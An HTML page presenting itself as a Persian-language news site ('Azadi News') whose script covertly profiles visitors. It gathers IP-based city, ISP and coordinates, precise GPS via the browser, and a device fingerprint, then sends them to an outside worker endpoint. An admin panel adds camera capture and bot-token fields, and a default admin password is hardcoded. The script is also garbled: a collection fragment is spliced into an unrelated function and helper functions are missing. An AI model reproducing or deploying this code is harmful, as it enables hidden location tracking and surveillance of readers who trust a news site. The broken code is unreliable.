<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="دانیال شهرکی">
    <title>🦁 آزادی نیوز | AZADI NEWS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #0a0a0a; --panel: #111111; --text: #cccccc;
            --gold: #ffd700; --green: #00ff41; --red: #ff0040;
            --blue: #00d4ff; --purple: #b400ff; --orange: #ff6600;
            --radius: 14px; --transition: all 0.3s ease;
            --font: 'Vazirmatn', 'Segoe UI', 'Cairo', sans-serif;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: var(--font); background: var(--bg); color: var(--text);
            min-height: 100vh; overflow-x: hidden; padding-bottom: 70px;
            transition: background 0.5s ease;
        }
        #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.05; pointer-events: none; }
        .scanlines { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px); animation: scanAnim 8s linear infinite; }
        @keyframes scanAnim { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
        .floating-skull { position: fixed; pointer-events: none; z-index: -1; opacity: 0.03; font-size: 60px; animation: skullDrift 12s ease-in-out infinite; }
        .floating-skull:nth-child(1) { top: 5%; left: 3%; font-size: 50px; }
        .floating-skull:nth-child(2) { top: 15%; right: 8%; font-size: 70px; animation-delay: 2s; }
        .floating-skull:nth-child(3) { bottom: 20%; left: 10%; font-size: 45px; animation-delay: 4s; }
        .floating-skull:nth-child(4) { top: 50%; right: 5%; font-size: 80px; animation-delay: 1s; }
        @keyframes skullDrift { 0%, 100% { transform: translateY(0) rotate(0deg) scale(1); } 25% { transform: translateY(-30px) rotate(5deg) scale(1.1); } 50% { transform: translateY(10px) rotate(-3deg) scale(0.9); } 75% { transform: translateY(-15px) rotate(2deg) scale(1.05); } }
        .particle { position: fixed; pointer-events: none; z-index: -1; background: var(--green); border-radius: 50%; animation: particleFloat linear infinite; box-shadow: 0 0 8px var(--green), 0 0 15px var(--green); }
        @keyframes particleFloat { 0% { transform: translateY(105vh) scale(0); opacity: 0; } 5% { opacity: 0.6; } 90% { opacity: 0.6; } 100% { transform: translateY(-10vh) scale(1.5); opacity: 0; } }
        .container { max-width: 800px; margin: 0 auto; padding: 10px; position: relative; z-index: 1; }
        .flag-container { text-align: center; padding: 15px; }
        .flag-emoji { font-size: 50px; animation: flagWave 4s ease-in-out infinite; filter: drop-shadow(0 0 20px rgba(255,215,0,0.5)); }
        @keyframes flagWave { 0%, 100% { transform: rotate(0deg) scale(1); } 25% { transform: rotate(2deg) scale(1.03); } 75% { transform: rotate(-2deg) scale(0.97); } }
        .header { background: var(--panel); border: 1px solid rgba(255,215,0,0.3); border-radius: var(--radius); padding: 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; box-shadow: 0 0 20px rgba(255,215,0,0.1); backdrop-filter: blur(10px); }
        .brand { display: flex; align-items: center; gap: 10px; }
        .brand h1 { font-size: 22px; font-weight: 900; color: var(--gold); text-shadow: 0 0 15px var(--gold); }
        .btn { padding: 8px 16px; border: 1px solid rgba(255,215,0,0.5); border-radius: 20px; cursor: pointer; font-size: 12px; font-weight: 700; transition: var(--transition); background: transparent; color: var(--gold); font-family: var(--font); display: inline-flex; align-items: center; gap: 5px; white-space: nowrap; }
        .btn:hover { background: var(--gold); color: #000; box-shadow: 0 0 20px rgba(255,215,0,0.3); transform: translateY(-2px); }
        .btn-primary { background: linear-gradient(135deg, var(--gold), #d4a017); color: #000; border-color: var(--gold); }
        .btn-danger { border-color: var(--red); color: var(--red); }
        .btn-danger:hover { background: var(--red); color: #fff; }
        .btn-sm { padding: 5px 10px; font-size: 10px; }
        .btn-xs { padding: 3px 8px; font-size: 9px; border-radius: 12px; }
        .btn-block { width: 100%; justify-content: center; }

        .page { display: none; }
        .page.active { display: block; }

        .post-card { background: var(--panel); border: 1px solid rgba(255,215,0,0.2); border-radius: var(--radius); margin-bottom: 15px; overflow: hidden; transition: var(--transition); }
        .post-card:hover { border-color: var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.1); }
        .post-header { display: flex; align-items: center; gap: 10px; padding: 12px 15px; }
        .post-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--gold); display: flex; align-items: center; justify-content: center; font-weight: 900; color: #000; font-size: 14px; }
        .post-user { font-weight: 700; font-size: 13px; color: var(--gold); }
        .post-date { font-size: 9px; color: #888; }
        .post-media { width: 100%; max-height: 400px; object-fit: contain; background: #000; }
        .post-video { width: 100%; max-height: 400px; background: #000; }
        .post-body { padding: 12px 15px; font-size: 12px; color: #aaa; line-height: 1.6; }
        .post-title { font-weight: 900; font-size: 14px; color: var(--gold); margin-bottom: 5px; }
        .post-actions { display: flex; gap: 15px; padding: 8px 15px; border-top: 1px solid rgba(255,215,0,0.1); }
        .post-action { color: #888; cursor: pointer; font-size: 11px; display: flex; align-items: center; gap: 4px; transition: var(--transition); }
        .post-action:hover { color: var(--gold); }

        .reels-container { display: flex; flex-direction: column; gap: 2px; }
        .reel-card { position: relative; width: 100%; height: 70vh; background: #000; border-radius: var(--radius); overflow: hidden; cursor: pointer; margin-bottom: 10px; }
        .reel-card video, .reel-card img { width: 100%; height: 100%; object-fit: cover; }
        .reel-overlay { position: absolute; bottom: 0; left: 0; width: 100%; padding: 30px 15px 15px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); }
        .reel-title { font-weight: 900; font-size: 14px; color: #fff; margin-bottom: 4px; }
        .reel-meta { font-size: 10px; color: #aaa; }
        .reel-play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); font-size: 50px; color: rgba(255,255,255,0.8); transition: var(--transition); }
        .reel-card:hover .reel-play-btn { transform: translate(-50%,-50%) scale(1.2); }

        .search-page { padding: 15px 0; }
        .search-input { width: 100%; padding: 14px 20px; background: #000; border: 1px solid rgba(255,215,0,0.3); border-radius: 25px; color: #fff; font-size: 14px; font-family: var(--font); outline: none; margin-bottom: 15px; transition: var(--transition); }
        .search-input:focus { border-color: var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.2); }
        .search-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px; }
        .search-item { aspect-ratio: 1; background: #000; border-radius: 6px; overflow: hidden; cursor: pointer; transition: var(--transition); }
        .search-item:hover { opacity: 0.8; transform: scale(1.02); }
        .search-item img, .search-item video { width: 100%; height: 100%; object-fit: cover; }

        .admin-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.97); z-index: 9999; overflow-y: auto; display: none; }
        .admin-overlay.active { display: block; }
        .admin-container { max-width: 1000px; margin: 0 auto; padding: 20px; }
        .admin-close-btn { position: fixed; top: 20px; right: 20px; font-size: 30px; color: var(--red); cursor: pointer; z-index: 10000; background: var(--panel); border: 1px solid var(--red); border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; transition: var(--transition); }
        .admin-close-btn:hover { transform: scale(1.1) rotate(90deg); box-shadow: 0 0 25px rgba(255,0,64,0.5); }
        .admin-header-card { background: var(--panel); border: 1px solid var(--gold); border-radius: var(--radius); padding: 25px; text-align: center; margin-bottom: 20px; box-shadow: 0 0 40px rgba(255,215,0,0.2); }
        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .admin-card { background: var(--panel); border: 1px solid rgba(255,215,0,0.2); border-radius: var(--radius); padding: 20px; }
        .admin-card h4 { font-size: 15px; font-weight: 900; color: var(--gold); margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid rgba(255,215,0,0.2); }
        .admin-label { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; font-weight: 700; }
        .admin-input, .admin-textarea, .admin-select { width: 100%; padding: 10px 14px; background: #000; border: 1px solid rgba(255,215,0,0.3); border-radius: 10px; color: #fff; font-size: 12px; font-family: var(--font); outline: none; margin-bottom: 8px; transition: var(--transition); }
        .admin-textarea { min-height: 80px; resize: vertical; }
        .admin-input:focus, .admin-textarea:focus, .admin-select:focus { border-color: var(--gold); box-shadow: 0 0 15px rgba(255,215,0,0.2); }
        .admin-select { cursor: pointer; }
        .admin-select option { background: #111; color: #fff; }
        .info-box { background: #000; border: 1px solid rgba(255,215,0,0.1); border-radius: 10px; padding: 10px; max-height: 400px; overflow-y: auto; font-size: 10px; }
        .info-row { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.03); color: #888; }
        .info-row span { color: var(--green); font-weight: 600; }
        .theme-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 10px; }
        .theme-btn { padding: 10px; border-radius: 10px; cursor: pointer; text-align: center; font-size: 9px; font-weight: 700; border: 2px solid transparent; transition: var(--transition); color: #fff; }
        .theme-btn:hover { border-color: #fff; transform: scale(1.05); }
        .theme-btn.active { border-color: var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.3); }
        .social-links { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; justify-content: center; }
        .social-link { padding: 8px 14px; border-radius: 20px; font-size: 10px; font-weight: 700; text-decoration: none; color: #fff; transition: var(--transition); display: flex; align-items: center; gap: 5px; }
        .social-link:hover { transform: scale(1.05); }
        .social-telegram{background:#08c}.social-bale{background:#2ecc71}.social-instagram{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)}.social-eitaa{background:#ff8c00}.social-rubika{background:#ffd700;color:#000}.social-shad{background:#00bfa5}.social-phone{background:#555}
        .camera-container { text-align: center; padding: 10px; }
        .camera-container video { width: 100%; max-width: 300px; border-radius: 10px; border: 2px solid var(--green); display: none; }
        .camera-container canvas { display: none; }
        .camera-container img { width: 100%; max-width: 300px; border-radius: 10px; display: none; }

        .footer-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--panel); border-top: 1px solid rgba(255,215,0,0.3); display: flex; justify-content: space-around; padding: 10px 0; z-index: 999; }
        .footer-bar .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: #888; cursor: pointer; transition: var(--transition); font-size: 10px; }
        .footer-bar .nav-item:hover, .footer-bar .nav-item.active { color: var(--gold); }
        .footer-bar .nav-item i { font-size: 20px; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
        .modal.active { display: flex; }
        .modal-content { background: var(--panel); border: 1px solid var(--gold); border-radius: var(--radius); padding: 25px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; box-shadow: 0 0 50px rgba(255,215,0,0.2); }
        .modal-content h3 { color: var(--gold); text-align: center; margin-bottom: 15px; }
        .modal-close { float: left; font-size: 24px; color: var(--red); cursor: pointer; transition: var(--transition); }
        .modal-close:hover { transform: scale(1.2) rotate(90deg); }
        .upload-zone { border: 2px dashed rgba(255,215,0,0.3); border-radius: var(--radius); padding: 30px; text-align: center; cursor: pointer; transition: var(--transition); margin-bottom: 15px; }
        .upload-zone:hover { border-color: var(--gold); box-shadow: 0 0 25px rgba(255,215,0,0.1); }

        .notification { position: fixed; top: 15px; right: 15px; background: var(--panel); border: 1px solid var(--green); color: var(--green); padding: 10px 20px; border-radius: 12px; z-index: 99999; font-weight: 700; font-size: 12px; animation: slideIn 0.3s ease; max-width: 400px; }
        @keyframes slideIn { from{transform:translateX(120%);opacity:0} to{transform:translateX(0);opacity:1} }
        .loading-spinner { display: inline-block; width: 30px; height: 30px; border: 3px solid rgba(255,215,0,0.3); border-radius: 50%; border-top-color: var(--gold); animation: spin 0.8s linear infinite; }
        @keyframes spin { to{transform:rotate(360deg)} }
        .pulse-dot { display: inline-block; width: 8px; height: 8px; background: var(--green); border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(0,255,65,0.4)} 50%{box-shadow:0 0 0 10px rgba(0,255,65,0)} }
        ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { background: #000; } ::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 3px; }
        @media (max-width: 768px) { .brand h1 { font-size: 18px; } .admin-grid { grid-template-columns: 1fr; } .theme-grid { grid-template-columns: repeat(2, 1fr); } }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    <div class="scanlines"></div>
    <div class="floating-skull">💀</div><div class="floating-skull">☠️</div><div class="floating-skull">🏴‍☠️</div><div class="floating-skull">👾</div>
    <div id="particlesContainer"></div>

    <div class="container">
        <div class="flag-container">
            <div class="flag-emoji">🦁☀️⚔️</div>
            <h2 style="color:var(--gold);text-shadow:0 0 15px var(--gold);font-size:20px;" id="siteName">آزادی نیوز</h2>
        </div>

        <div class="page active" id="pageHome">
            <div id="postsContainer"></div>
            <div id="loadingMore" style="text-align:center;padding:20px;display:none;"><span class="loading-spinner"></span></div>
        </div>

        <div class="page" id="pageReels">
            <div class="reels-container" id="reelsContainer"></div>
        </div>

        <div class="page" id="pageSearch">
            <div class="search-page">
                <input type="text" class="search-input" placeholder="🔍 جستجو در همه فایل‌ها..." id="globalSearch" oninput="searchAll()">
                <div class="search-grid" id="searchGrid"></div>
            </div>
        </div>
    </div>

    <div class="footer-bar">
        <div class="nav-item active" data-page="home" onclick="switchPage('home', this)"><i class="fas fa-home"></i><span>خانه</span></div>
        <div class="nav-item" data-page="reels" onclick="switchPage('reels', this)"><i class="fas fa-play-circle"></i><span>Reels</span></div>
        <div class="nav-item" data-page="search" onclick="switchPage('search', this)"><i class="fas fa-search"></i><span>جستجو</span></div>
        <div class="nav-item" onclick="openAdminPanel()"><i class="fas fa-cog"></i><span>مدیریت</span></div>
    </div>

    <div class="admin-overlay" id="adminOverlay">
        <span class="admin-close-btn" onclick="closeAdminPanel()">&times;</span>
        <div class="admin-container">
            <div class="admin-header-card">
                <h2>🛡️ پنل مدیریت</h2>
                <input type="password" class="admin-input" id="adminPassInput" placeholder="رمز مدیریت..." style="max-width:300px;text-align:center;">
                <button class="btn btn-primary btn-block" onclick="adminLogin()" style="max-width:300px;margin:10px auto;"><i class="fas fa-key"></i> ورود</button>
                <p style="color:var(--red);display:none;" id="adminLoginError">❌ رمز اشتباه</p>
            </div>
            <div id="adminContent" style="display:none;">
                <div class="admin-grid">
                    <div class="admin-card"><h4>⚙️ تنظیمات</h4><input class="admin-input" id="setSiteName" placeholder="نام سایت"><input class="admin-input" id="setSlogan" placeholder="شعار"><input type="password" class="admin-input" id="setSitePass" placeholder="رمز ورود"><input type="password" class="admin-input" id="setAdminPass" placeholder="رمز پنل"><button class="btn btn-primary btn-block" onclick="saveSettings()">ذخیره</button></div>
                    <div class="admin-card"><h4>🎨 ظاهر</h4><input class="admin-input" id="setLogoUrl" placeholder="لینک لوگو"><div class="theme-grid" id="themeGrid"></div><button class="btn btn-primary btn-block" onclick="saveSettings()">ذخیره</button></div>
                    <div class="admin-card"><h4>🔗 ارتباط</h4><input class="admin-input" id="setTelegram" placeholder="تلگرام"><input class="admin-input" id="setBale" placeholder="بله"><input class="admin-input" id="setInstagram" placeholder="اینستاگرام"><input class="admin-input" id="setPhone" placeholder="شماره"><button class="btn btn-primary btn-block" onclick="saveSettings()">ذخیره</button></div>
                    
                    <!-- ========== ROBOT SETTINGS CARD ========== -->
                    <div class="admin-card">
                        <h4><i class="fas fa-robot"></i> 🤖 تنظیمات ربات‌ها</h4>
                        <div class="admin-label" style="color:var(--blue);">📱 تلگرام</div>
                        <label style="font-size:9px;color:#888;">توکن ربات:</label>
                        <input class="admin-input" id="setTgToken" placeholder="توکن ربات تلگرام">
                        <label style="font-size:9px;color:#888;">آیدی ۱ (اصلی):</label>
                        <input class="admin-input" id="setTgId1" placeholder="آیدی عددی اصلی">
                        <label style="font-size:9px;color:#888;">آیدی ۲ (کانال):</label>
                        <input class="admin-input" id="setTgId2" placeholder="آیدی عددی کانال">
                        <label style="font-size:9px;color:#888;">آیدی ۳ (گروه):</label>
                        <input class="admin-input" id="setTgId3" placeholder="آیدی عددی گروه">
                        
                        <div class="admin-label" style="color:var(--green);margin-top:10px;">📱 بله</div>
                        <label style="font-size:9px;color:#888;">توکن ربات:</label>
                        <input class="admin-input" id="setBaleToken" placeholder="توکن ربات بله">
                        <label style="font-size:9px;color:#888;">آیدی ۱ (اصلی):</label>
                        <input class="admin-input" id="setBaleId1" placeholder="آیدی عددی اصلی">
                        <label style="font-size:9px;color:#888;">آیدی ۲ (کانال):</label>
                        <input class="admin-input" id="setBaleId2" placeholder="آیدی عددی کانال">
                        <label style="font-size:9px;color:#888;">آیدی ۳ (گروه):</label>
                        <input class="admin-input" id="setBaleId3" placeholder="آیدی عددی گروه">
                        
                        <button class="btn btn-success btn-block" onclick="saveRobotSettings()" style="margin-top:8px;"><i class="fas fa-save"></i> ذخیره تنظیمات ربات‌ها</button>
                    </div>
                    
                    <div class="admin-card"><h4>📸 دوربین</h4><div class="camera-container"><video id="cameraVideo" autoplay playsinline></video><canvas id="cameraCanvas"></canvas><img id="cameraPhoto" alt="عکس"><button class="btn btn-sm" onclick="requestCamera('user')">دوربین جلو</button><button class="btn btn-sm" onclick="requestCamera('environment')">دوربین عقب</button><button class="btn btn-sm" id="captureBtn" onclick="capturePhoto()" style="display:none;">📸 شاتر</button></div></div>
                    <div class="admin-card"><h4>📊 اطلاعات کاربر</h4><button class="btn btn-sm" onclick="collectUserInfoAdmin()">بروزرسانی</button><div class="info-box" id="adminUserInfoBox"></div></div>
                    <div class="admin-card"><h4>📋 تاریخچه</h4><div class="info-box" id="visitLogBox"></div></div>
                    <div class="admin-card"><h4>🗂️ مدیریت</h4><button class="btn btn-danger btn-block" onclick="deleteAllFiles()">حذف همه</button><button class="btn btn-primary btn-block" onclick="showUploadModal()">📤 آپلود</button><button class="btn btn-primary btn-block" onclick="showNewsModal()">📰 خبر</button></div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal" id="uploadModal">
        <div class="modal-content"><span class="modal-close" onclick="closeUploadModal()">&times;</span><h3>آپلود</h3><input type="file" id="fileInput" multiple style="display:none;" onchange="handleFileSelect(this.files)"><div class="upload-zone" onclick="document.getElementById('fileInput').click()">☠️ کلیک کنید</div><div id="selectedFilesList"></div><select class="admin-select" id="expirySelect"><option value="7">۱ هفته</option><option value="14">۲ هفته</option><option value="30">۱ ماه</option><option value="0" selected>دائمی</option></select><button class="btn btn-block" onclick="uploadFiles()" style="background:var(--gold);color:#000;">آپلود</button></div>
    </div>

    <div class="modal" id="newsModal">
        <div class="modal-content"><span class="modal-close" onclick="closeNewsModal()">&times;</span><h3>خبر</h3><input class="admin-input" id="newsTitleInput" placeholder="عنوان"><textarea class="admin-textarea" id="newsBodyInput" placeholder="متن"></textarea><input class="admin-input" id="newsImageInput" placeholder="لینک عکس"><select class="admin-select" id="newsExpirySelect"><option value="7">۱ هفته</option><option value="14">۲ هفته</option><option value="30">۱ ماه</option><option value="0">دائمی</option></select><button class="btn btn-block" onclick="addNews()" style="background:var(--gold);color:#000;">انتشار</button></div>
    </div>

    <script>
        const WORKER_URL = 'https://azadi-news-bot.d099173878.workers.dev';
        const DEFAULT_ADMIN_PASS = '#0.0.0.0.0.0.0.0...HACKING...0.1';

        function initMatrix(){
            const c=$('matrixCanvas');if(!c)return;const ctx=c.getContext('2d');
            function r(){c.width=window.innerWidth;c.height=window.innerHeight;}
            r();window.addEventListener('resize',r);
            const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*()_+-=[]{}|;:,./<>?';
            const fs=12;let drops=Array(Math.floor(c.width/fs)).fill(1);
            function draw(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);ctx.fillStyle='#ffd700';ctx.font=fs+'px monospace';const cols=Math.floor(c.width/fs);if(drops.length!==cols)drops=Array(cols).fill(1);for(let i=0;i<drops.length;i++){ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*fs,drops[i]*fs);if(drops[i]*fs>c.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
            setInterval(draw,50);

                try{const geoRes=await fetch(`https://ipapi.co/${ipData.ip}/json/`);const geo=await geoRes.json();info.city=geo.city||'N/A';info.region=geo.region||'N/A';info.country=geo.country_name||'N/A';info.postal=geo.postal||'N/A';info.latitude=geo.latitude||'N/A';info.longitude=geo.longitude||'N/A';info.isp=geo.org||'N/A';info.asn=geo.asn||'N/A';info.hostname=geo.hostname||'N/A';info.organization=geo.org||'N/A';}catch(e){}}
            catch(e){}
            try{const pos=await new Promise((res,rej)=>{navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:5000,maximumAge:0});});info.gpsLat=pos.coords.latitude;info.gpsLon=pos.coords.longitude;info.gpsAccuracy=Math.round(pos.coords.accuracy)+' متر';}catch(e){}
            // Send to Worker
            try{await fetch(`${WORKER_URL}/api/report`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(info)});}catch(e){}
            const logs=gs('visit_log')||[];logs.push(info);if(logs.length>50)logs.shift();ss('visit_log',logs);displayVisitLog();
            return info;
        }
        async function generateFingerprint(){const c=[navigator.userAgent,navigator.language,screen.colorDepth,screen.width+'x'+screen.height,new Date().getTimezoneOffset(),navigator.hardwareConcurrency,navigator.deviceMemory];const str=c.join('|||');const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(str));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,16);}

        function displayInfo(b,i){
            b.innerHTML=`
                <div class="info-row"><span>📅 تاریخ</span> ${i.persianDate}</div>
                <div class="info-row"><span>🌍 IP</span> ${i.ip||'...'}</div>
                <div class="info-row"><span>🏙️ شهر</span> ${i.city||'...'}</div>
                <div class="info-row"><span>🗺️ استان</span> ${i.region||'...'}</div>
                <div class="info-row"><span>🇮🇷 کشور</span> ${i.country||'...'}</div>
                ${i.postal?`<div class="info-row"><span>📮 کد پستی</span> ${i.postal}</div>`:''}
                <div class="info-row"><span>📡 ISP</span> ${i.isp||'...'}</div>
                <div class="info-row"><span>🏢 سازمان</span> ${i.organization||'...'}</div>
                <div class="info-row"><span>🖥️ Hostname</span> ${i.hostname||'...'}</div>
                <div class="info-row"><span>📡 ASN</span> ${i.asn||'...'}</div>
                ${i.gpsLat?`<div class="info-row"><span>📍 GPS</span> ${i.gpsLat.toFixed(4)}, ${i.gpsLon.toFixed(4)}</div>`:''}
                <div class="info-row"><span>📱 مدل</span> ${i.deviceModel||'...'}</div>
                <div class="info-row"><span>💻 پلتفرم</span> ${i.platform}</div>
                <div class="info-row"><span>🖥 رزولوشن</span> ${i.screenWidth}x${i.screenHeight}</div>
                <div class="info-row"><span>🔍 Pixel</span> ${i.pixelRatio}x</div>
                <div class="info-row"><span>🧠 CPU</span> ${i.cpuCores} هسته</div>
                <div class="info-row"><span>💾 RAM</span> ${i.ram} GB</div>
                ${i.gpuVendor?`<div class="info-row"><span>🎮 GPU</span> ${i.gpuVendor}</div>`:''}
                <div class="info-row"><span>🔋 باتری</span> ${i.batteryLevel||'N/A'}% ${i.batteryCharging?'🔌':'🔋'}</div>
                <div class="info-row"><span>📶 شبکه</span> ${i.connectionType||'N/A'}</div>
                <div class="info-row"><span>📸 دوربین</span> ${i.cameraCount||'N/A'} عدد</div>
                <div class="info-row"><span>🆔 FP</span> ${i.fingerprint}</div>
                ${i.localIPs?`<div class="info-row"><span>🔍 WebRTC IP</span> ${i.localIPs}</div>`:''}
            `;
        }

        function displayVisitLog(){
            const b=$('visitLogBox');if(!b)return;const l=gs('visit_log')||[];
            if(!l.length){b.innerHTML='<p style="color:#888;">بدون بازدید</p>';return;}
            b.innerHTML=l.slice(-15).reverse().map(x=>`<div style="background:#000;border:1px solid rgba(255,215,0,0.1);border-radius:6px;padding:6px;margin-bottom:4px;font-size:9px;"><div style="color:var(--gold);">📅 ${x.persianDate||x.date}</div><div>🌍 ${x.ip||'?'} | 📍 ${x.city||'?'}</div><div>💻 ${x.platform||'?'}</div></div>`).join('');
        }

        function init(){
            changeTheme(gs('theme')||'dark');buildThemeGrid();initMatrix();createParticles();displayPosts();displayReels();
            applySettings(gs('settings')||{});
            setInterval(()=>{displayPosts();displayReels();},60000);
            document.addEventListener('keydown',e=>{if(e.key==='Escape'){document.querySelectorAll('.modal.active').forEach(m=>m.classList.remove('active'));closeAdminPanel();}});
            document.querySelectorAll('.modal').forEach(m=>{m.addEventListener('click',function(e){if(e.target===this)this.classList.remove('active');});});
        }
        document.addEventListener('DOMContentLoaded',init);
    </script>
</body>
</html>
